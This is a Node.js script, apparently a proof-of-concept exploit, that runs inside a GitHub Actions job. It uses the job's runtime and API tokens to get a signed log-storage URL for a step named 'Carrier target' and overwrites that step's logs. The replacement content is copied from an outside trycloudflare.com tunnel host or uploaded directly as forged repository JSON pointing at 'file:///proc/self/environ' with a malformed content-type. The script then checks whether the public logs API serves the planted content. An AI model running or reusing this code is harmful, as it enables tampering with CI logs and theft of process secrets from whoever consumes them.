import https from 'node:https';

const sourceBase = 'https://overview-watches-swim-township.trycloudflare.com/';
const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
const apiToken = process.env.GITHUB_TOKEN;
const resultsBase = process.env.ACTIONS_RESULTS_URL;
const repositoryName = process.env.GITHUB_REPOSITORY;
const runId = process.env.GITHUB_RUN_ID;

function request(url, options = {}, body = undefined) {
  return new Promise((resolve, reject) => {
    const req = https.request(url, options, response => {
      const chunks = [];
      response.on('data', chunk => chunks.push(chunk));
      response.on('end', () => resolve({
        status: response.statusCode,
        headers: response.headers,
        body: Buffer.concat(chunks),
      }));
    });
    req.on('error', reject);
    req.setTimeout(20000, () => req.destroy(new Error('request timeout')));
    if (body !== undefined) req.write(body);
    req.end();
  });
}

const sleep = milliseconds => new Promise(resolve => setTimeout(resolve, milliseconds));

async function postReceiver(method, document) {
  const body = Buffer.from(JSON.stringify(document));
  const url = new URL(
    `/twirp/results.services.receiver.Receiver/${method}`,
    resultsBase,
  );
  return request(url, {
    method: 'POST',
    headers: {
      authorization: `Bearer ${runtimeToken}`,
      accept: 'application/json',
      'content-type': 'application/json',
      'content-length': String(body.length),
    },
  }, body);
}

async function githubApi(path, authenticated = true, apiVersion = undefined) {
  const headers = {
    accept: 'application/vnd.github.v3+json',
    'user-agent': 'repo-cassette-step-log-probe',
  };
  if (authenticated) headers.authorization = `Bearer ${apiToken}`;
  if (apiVersion) headers['x-github-api-version'] = apiVersion;
  return request(`https://api.github.com/repos/${repositoryName}${path}`, {headers});
}

function contentTypeHex(response) {
  return Buffer.from(response?.headers?.['content-type'] || '', 'latin1').toString('hex');
}

const claims = JSON.parse(Buffer.from(runtimeToken.split('.')[1], 'base64url'));
const scope = claims.scp.split(' ').find(value => value.startsWith('Actions.Results:'));
if (!scope) throw new Error('runtime token has no Actions.Results scope');
const [, workflowRunBackendId, workflowJobRunBackendId] = scope.split(':');

let jobId;
for (let attempt = 0; attempt < 60 && !jobId; attempt++) {
  const response = await githubApi(`/actions/runs/${runId}/jobs?filter=all`);
  if (response.status === 200) {
    const jobs = JSON.parse(response.body);
    jobId = jobs.jobs?.find(job => job.name === process.env.GITHUB_JOB)?.id ?? jobs.jobs?.[0]?.id;
  }
  if (!jobId) await sleep(250);
}
if (!jobId) throw new Error('could not discover REST job id');

let target;
for (let attempt = 0; attempt < 80 && !target; attempt++) {
  const response = await request(
    `https://github.com/${repositoryName}/actions/runs/${runId}/job/${jobId}`,
    {headers: {'user-agent': 'repo-cassette-step-log-probe'}},
  );
  const html = response.body.toString();
  for (const match of html.matchAll(/<check-step\s+([\s\S]*?)>/g)) {
    const attributes = match[1];
    const name = attributes.match(/data-name="([^"]*)"/)?.[1];
    if (name !== 'Carrier target') continue;
    const number = attributes.match(/data-number="(\d+)"/)?.[1];
    const backendId = attributes.match(/data-external-id="([0-9a-f-]{36})"/)?.[1];
    if (number && backendId) target = {number: Number(number), backendId};
  }
  if (!target) await sleep(250);
}
if (!target) throw new Error('could not discover carrier step backend id');

const identity = {
  workflow_run_backend_id: workflowRunBackendId,
  workflow_job_run_backend_id: workflowJobRunBackendId,
  step_backend_id: target.backendId,
};
const signedResponse = await postReceiver('GetStepLogsSignedBlobURL', identity);
if (signedResponse.status !== 200) {
  throw new Error(`GetStepLogsSignedBlobURL returned ${signedResponse.status}: ${signedResponse.body}`);
}
const signed = JSON.parse(signedResponse.body);
const signedUrl = signed.logs_url;
if (!signedUrl) throw new Error('receiver returned no logs_url');

const repository = `${repositoryName}/actions/jobs/${jobId}/steps/${target.number}/logs`;
const expected = Buffer.from(JSON.stringify({
  full_name: repository,
  owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
  description: 'Repo Cassette carrier',
  stargazers_count: 0,
}));
const source = `${sourceBase}?repository=${encodeURIComponent(repository)}`;

const copy = await request(signedUrl, {
  method: 'PUT',
  headers: {
    'x-ms-version': '2023-11-03',
    'x-ms-copy-source': source,
    'x-ms-blob-type': 'BlockBlob',
    'content-length': '0',
  },
});

let writeMode = 'copy';
if (copy.status !== 201 && copy.status !== 202) {
  writeMode = 'direct';
  const direct = await request(signedUrl, {
    method: 'PUT',
    headers: {
      'x-ms-blob-type': 'BlockBlob',
      'content-type': 'application/json\x85',
      'content-length': String(expected.length),
    },
  }, expected);
  if (direct.status !== 201) {
    throw new Error(`copy ${copy.status} and direct upload ${direct.status} both failed`);
  }
}

let current;
for (let attempt = 0; attempt < 60; attempt++) {
  current = await request(signedUrl);
  if (current.status === 200 && current.body.equals(expected)) break;
  await sleep(250);
}
const oldVersion = await request(`${signedUrl}&api-version=2012-02-12`);

const metadata = await postReceiver('CreateStepLogsMetadata', {
  ...identity,
  uploaded_at: new Date().toISOString(),
  line_count: 1,
});

console.log('STEP-CARRIER', JSON.stringify({
  jobId,
  stepNumber: target.number,
  stepBackendId: target.backendId,
  repository,
  expectedBytes: expected.length,
  blobStorageType: signed.blob_storage_type,
  signedQueryKeys: [...new URL(signedUrl).searchParams.keys()].sort(),
  signedPermissions: new URL(signedUrl).searchParams.get('sp'),
  writeMode,
  copyStatus: copy.status,
  current: {status: current?.status, typeHex: contentTypeHex(current), bodyMatch: current?.body.equals(expected)},
  oldVersion: {status: oldVersion.status, typeHex: contentTypeHex(oldVersion), bodyMatch: oldVersion.body.equals(expected)},
  metadata: {status: metadata.status, body: metadata.body.toString().slice(0, 200)},
}));

for (let attempt = 0; attempt < 45; attempt++) {
  for (const authenticated of [false, true]) {
    for (const apiVersion of [undefined, '2022-11-28', '2026-03-10']) {
      const response = await githubApi(
        `/actions/jobs/${jobId}/steps/${target.number}/logs`,
        authenticated,
        apiVersion,
      );
      if (response.status !== 302) continue;
      const location = response.headers.location;
      const final = await request(location);
      console.log('STEP-PUBLIC-HIT', JSON.stringify({
        repository,
        authenticated,
        apiVersion: apiVersion ?? null,
        redirectStatus: response.status,
        locationQueryKeys: [...new URL(location).searchParams.keys()].sort(),
        rsct: new URL(location).searchParams.get('rsct'),
        apiVersionQuery: new URL(location).searchParams.get('api-version'),
        finalStatus: final.status,
        finalTypeHex: contentTypeHex(final),
        bodyMatch: final.body.equals(expected),
      }));
      process.exit(0);
    }
  }
  await sleep(1000);
}

const last = await githubApi(`/actions/jobs/${jobId}/steps/${target.number}/logs`, false);
console.log('STEP-PUBLIC-MISS', JSON.stringify({
  repository,
  status: last.status,
  typeHex: contentTypeHex(last),
  body: last.body.toString().slice(0, 240),
}));
